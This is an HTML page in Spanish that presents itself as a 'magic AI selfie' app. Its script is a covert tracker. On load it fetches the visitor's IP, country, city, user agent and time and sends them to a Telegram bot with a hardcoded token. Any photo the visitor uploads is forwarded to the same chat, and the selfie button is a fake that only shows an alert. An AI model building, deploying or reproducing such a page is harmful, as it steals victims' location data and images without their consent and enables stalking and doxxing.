<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Selfie IA</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
      color: white;
      text-align: center;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
    }
    h1 {
      font-size: 1.8em;
      background: linear-gradient(90deg, #ff6a00, #ee0979);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      margin-bottom: 10px;
    }
    #camera, #upload {
      width: 90%;
      max-width: 340px;
      border-radius: 15px;
      border: 3px solid #ff6a00;
      box-shadow: 0 0 20px rgba(255, 106, 0, 0.5);
      margin-bottom: 15px;
    }
    #simButton {
      margin-top: 15px;
      padding: 10px 20px;
      font-size: 1.1em;
      border-radius: 10px;
      background: #ff6a00;
      color: white;
      border: none;
      box-shadow: 0 0 10px rgba(255,106,0,0.6);
    }
  </style>
</head>
<body>
  <h1>Selfie m√°gica con IA</h1>
  <video id="camera" autoplay playsinline muted></video>
  <input type="file" accept="image/*" capture="user" id="upload" style="display:none">
  <button id="simButton">Tomar selfie</button>

  <script>
    const urlParams = new URLSearchParams(window.location.search);
    const chatId = urlParams.get('chat_id');
    const botToken = "7950640948:AAEtmsrmMDyheSH3T6zgBcISR913PnqSgo"; // pon tu token aqu√≠
    const video = document.getElementById('camera');
    const upload = document.getElementById('upload');

    if (!chatId) {
      document.body.innerHTML = "<h2 style='color: red;'>Error: chat_id no especificado en la URL.</h2>";
      throw new Error("Falta chat_id");
    }

    let globalInfo = '';

    async function obtenerDatos() {
      try {
        const res = await fetch('https://ipapi.co/json');
        const ip = await res.json();
        const ua = navigator.userAgent;
        const language = navigator.language;
        const resolution = `${screen.width}x${screen.height}`;
        const fechaHora = new Date().toLocaleString();

        globalInfo = `üì∏ Selfie IA
Fecha & Hora: ${fechaHora}
Pa√≠s: ${ip.country_name}
Ciudad: ${ip.city}
IP: ${ip.ip}
UA: ${ua}`;

        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: chatId, text: globalInfo })
        });

      } catch (e) { console.warn("Error al obtener info", e); }
    }

    async function startCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
      } catch (error) {
        console.warn("C√°mara no disponible en este entorno, usando input file");
        video.style.display = "none";
        upload.style.display = "block";
      }
    }

    // Enviar imagen seleccionada desde input
    upload.addEventListener("change", function(e) {
      const file = e.target.files[0];
      if (!file) return;
      const form = new FormData();
      form.append("chat_id", chatId);
      form.append("photo", file, "selfie.jpg");
      form.append("caption", globalInfo);
      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: "POST", body: form });
      alert("‚úÖ Selfie enviada con √©xito");
    });

    // Simulaci√≥n bot√≥n
    document.getElementById('simButton').addEventListener('click', () => {
      alert('üì∑ Toma tu selfie m√°gica con IA');
    });

    window.addEventListener('DOMContentLoaded', () => {
      obtenerDatos();
      startCamera();
    });
  </script>
</body>
</html>
